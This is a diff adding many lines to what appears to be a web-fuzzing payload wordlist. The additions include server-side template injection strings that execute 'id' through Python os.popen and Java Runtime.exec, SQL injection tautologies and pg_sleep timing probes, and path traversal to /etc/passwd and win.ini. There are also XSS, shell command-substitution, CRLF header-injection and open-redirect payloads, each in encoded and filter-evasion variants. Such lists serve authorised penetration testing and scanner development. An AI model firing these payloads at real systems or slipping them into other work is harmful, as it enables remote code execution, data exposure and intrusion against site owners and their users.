@@ -78,3 +78,164 @@ ssti_2
 %23%7B7%2A7%7D_3
 ssti_3
 /ssti/3
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+${{7*7}}
+%24%7B%7B7%2A7%7D%7D
+%2524%257B%257B7%252A7%257D%257D
+${{7*7}}?aurose=1
+${{7*7}}&aurose=1
+{{config.items()}}
+%7B%7Bconfig.items%28%29%7D%7D
+%257B%257Bconfig.items%2528%2529%257D%257D
+{{CONFIG.ITEMS()}}
+{{config.items()}}?aurose=1
+{{config.items()}}&aurose=1
+{{''.class.mro()[1].__subclasses__()}}
+%7B%7B%27%27.class.mro%28%29%5B1%5D.__subclasses__%28%29%7D%7D
+%257B%257B%2527%2527.class.mro%2528%2529%255B1%255D.__subclasses__%2528%2529%257D%257D
+{{''.CLASS.MRO()[1].__SUBCLASSES__()}}
+{{''.class.mro()[1].__subclasses__()}}?aurose=1
+{{''.class.mro()[1].__subclasses__()}}&aurose=1
+${T(java.lang.Runtime).getRuntime().exec('id')}
+%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%7D
+%2524%257BT%2528java.lang.Runtime%2529.getRuntime%2528%2529.exec%2528%2527id%2527%2529%257D
+${T(JAVA.LANG.RUNTIME).GETRUNTIME().EXEC('ID')}
+${T(java.lang.Runtime).getRuntime().exec('id')}?aurose=1
+${T(java.lang.Runtime).getRuntime().exec('id')}&aurose=1
+%253C%2525%253D%25207%252A7%2520%2525%253E
+<%=/**/7*7/**/%>
+<%%3d 7*7 %>
+<%= 7*7 %>?aurose=1
+<%= 7*7 %>&aurose=1
+{{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}
+%7B%7B%20self.__init__.__globals__.__builtins__.__import__%28%22os%22%29.popen%28%22id%22%29.read%28%29%20%7D%7D
+%257B%257B%2520self.__init__.__globals__.__builtins__.__import__%2528%2522os%2522%2529.popen%2528%2522id%2522%2529.read%2528%2529%2520%257D%257D
+{{/**/self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()/**/}}
+{{ SELF.__INIT__.__GLOBALS__.__BUILTINS__.__IMPORT__("OS").POPEN("ID").READ() }}
+{{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}?aurose=1
+{{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}&aurose=1
+{% for c in [1] %}{{7*7}}{% endfor %}
+%7B%25%20for%20c%20in%20%5B1%5D%20%25%7D%7B%7B7%2A7%7D%7D%7B%25%20endfor%20%25%7D
+%257B%2525%2520for%2520c%2520in%2520%255B1%255D%2520%2525%257D%257B%257B7%252A7%257D%257D%257B%2525%2520endfor%2520%2525%257D
+{%/**/for/**/c/**/in/**/[1]/**/%}{{7*7}}{%/**/endfor/**/%}
+{% FOR C IN [1] %}{{7*7}}{% ENDFOR %}
+{% for c in [1] %}{{7*7}}{% endfor %}?aurose=1
+{% for c in [1] %}{{7*7}}{% endfor %}&aurose=1
+%2523%257B7%252A7%257D
+#{7*7}?aurose=1
+#{7*7}&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+{{7*7}}::var0
+%7B%7B7%2A7%7D%7D::v0
+/ssti/probe/0
+${7*7}::var1
+%24%7B7%2A7%7D::v1
+/ssti/probe/1
+${{7*7}}::var2
+%24%7B%7B7%2A7%7D%7D::v2
+/ssti/probe/2
+{{config.items()}}::var3
+%7B%7Bconfig.items%28%29%7D%7D::v3
+/ssti/probe/3
+{{''.class.mro()[1].__subclasses__()}}::var4
+%7B%7B%27%27.class.mro%28%29%5B1%5D.__subclasses__%28%29%7D%7D::v4
+/ssti/probe/4
+${T(java.lang.Runtime).getRuntime().exec('id')}::var5
+%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29%7D::v5
+/ssti/probe/5
+<%= 7*7 %>::var6
+%3C%25%3D%207%2A7%20%25%3E::v6
+/ssti/probe/6
+{{ self.__init__.__globals__.__builtins__.__import__("os").popen("id").read() }}::var7
+%7B%7B%20self.__init__.__globals__.__builtins__.__import__%28%22os%22%29.popen%28%22id%22%29.read%28%29%20%7D%7D::v7
+/ssti/probe/7
+{% for c in [1] %}{{7*7}}{% endfor %}::var8
+%7B%25%20for%20c%20in%20%5B1%5D%20%25%7D%7B%7B7%2A7%7D%7D%7B%25%20endfor%20%25%7D::v8
+/ssti/probe/8
+#{7*7}::var9
+%23%7B7%2A7%7D::v9
+/ssti/probe/9
+' OR '1'='1::var10
+%27%20OR%20%271%27%3D%271::v10
+/ssti/probe/10
+" OR "1"="1::var11
+%22%20OR%20%221%22%3D%221::v11
+/ssti/probe/11
+' AND 1=1 --::var12
+%27%20AND%201%3D1%20--::v12
+/ssti/probe/12
